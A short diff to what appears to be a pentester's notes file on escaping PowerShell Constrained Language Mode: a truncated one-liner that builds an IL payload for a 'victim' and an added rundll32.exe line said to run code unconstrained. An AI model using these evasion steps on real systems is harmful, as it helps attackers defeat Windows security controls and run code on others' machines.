@@ -13,3 +13,7 @@ ipmo .\Invoke-SeeEllEm; Create-AppIl -Entry "Poon" -Command "$ExecutionContext.S
 ```
 - Generates a il to be transferred to the victim & compiled there, useful combined with https://github.com/FortyNorthSecurity/CLM-Base64 (Takes utf-8 not utf-16LE like windows powershell base64 does so cat file.il | base64 -w0)
 
+
+
+`rundll32.exe Dllname.dll,EntryChosen`
+- will execute in Unconstrained Language Mode if you have done your enum properly ;)
